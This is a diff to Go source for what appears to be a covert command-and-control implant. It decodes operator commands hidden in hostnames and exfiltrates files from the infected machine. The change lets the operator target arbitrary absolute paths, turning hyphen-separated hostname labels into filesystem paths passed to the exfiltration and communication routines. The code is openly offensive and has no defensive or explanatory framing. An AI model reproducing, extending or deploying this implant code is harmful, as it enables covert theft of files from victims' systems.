@@ -15,18 +15,42 @@ import (
 
 func resolveCommand(host []string, bl *int) {
 	// Change the mappings here to customize what triggers will be responsible for different operations. Ex: "cmd": "mail"
-	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "ls": "ls"}
+	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "ls": "ls", "single": "single", "path": "path"}
 
 	// If the host contains the string "cmd", we know that the server is sending the client a command to execute.
 	if strings.Contains(host[0], trigger_mappings["cmd"]) {
+		// Determine if the client is looking for a file name or a file at a specific path
+
 		fmt.Printf("Received command: %v\n", host[0])
+
+		// Sections are:
+		//		[0]		cmd
+		//		[1]		action-type
+		// 		[2]		filename-or-filepath
+		//		[3]		extension
 		sections := strings.Split(host[0], ".")
-		switch sections[1] {
+
+		// Action type (exfil, ls, etc.)
+		action_type := strings.Split(sections[1], "-")[0]
+
+		// Destination type (filename or filepath; "single" or "path")
+		dest_type := strings.Split(sections[1], "-")[1]
+
+		// var filepath string = ""
+		filepath := fmt.Sprintf("%v.%v", sections[2], sections[3])
+		if trigger_mappings[dest_type] == "path" {
+			filepath_sections := strings.Split(sections[2], "-")
+			filepath = strings.Join(filepath_sections, "/")
+			filepath = fmt.Sprintf("/%v.%v", filepath, sections[3])
+		}
+
+		switch action_type {
+
 		// Download command has been received
 		case trigger_mappings["exf"]:
-			fmt.Printf("Downloading: %v\n", (sections[2] + "." + sections[3]))
+			fmt.Printf("Downloading: %v\n", filepath)
 			// Perform the usual exfil operation as you would otherwise
-			dat := setup_exfil(sections[2] + "." + sections[3])
+			dat := setup_exfil(filepath)
 			var mode string = "exfil"
 			begin_comm(&dat, bl, &mode)
 
